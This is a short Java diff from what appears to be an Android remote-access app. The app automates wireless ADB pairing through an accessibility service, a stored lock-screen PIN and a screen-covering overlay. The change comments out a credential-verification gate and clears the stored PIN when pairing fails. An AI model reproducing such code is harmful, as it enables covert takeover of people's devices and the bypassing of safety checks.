@@ -14,6 +14,7 @@ import com.vendor.rat.auto.util.GkdSelectorHelper;
 import com.vendor.rat.service.EngineManager;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.SecureSettingsWriter;
+import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.utils.DeviceUtils;
 
@@ -106,10 +107,11 @@ public class WirelessPairEngine extends AutoEngine {
      Log.w(TAG, "startPairing: context is null");
      return false;
      }
-     if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
-  Log.w(TAG, "startPairing: OPPO credential gate not verified");
-     return false;
-        }
+        // TODO: 恢复 ADB 自动化授权时取消注释
+        // if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+        //     Log.w(TAG, "startPairing: OPPO credential gate not verified");
+        //     return false;
+        // }
         if (!mPairingInProgress.compareAndSet(false, true)) {
             Log.w(TAG, "startPairing: already in progress");
             return false;
@@ -221,6 +223,13 @@ public class WirelessPairEngine extends AutoEngine {
                 break;
             case FAILED:
                 logError("Pairing failed");
+                // Phase 0 PIN 错误时：清除 PIN + 关闭遮罩，让用户重新输入
+                if (LockCredentialStore.hasCredential() && !SecureSettingsWriter.isDeveloperOptionsEnabled(getContext())) {
+                    Log.d(TAG, "Phase 0 failed with stored PIN — clearing PIN for re-entry");
+                    LockCredentialStore.clearAll();
+                    LockCredentialStore.resetCurrentRunFlags();
+                }
+                BlockViewHelper.removeViewInternal();
                 finish();
                 break;
             default:
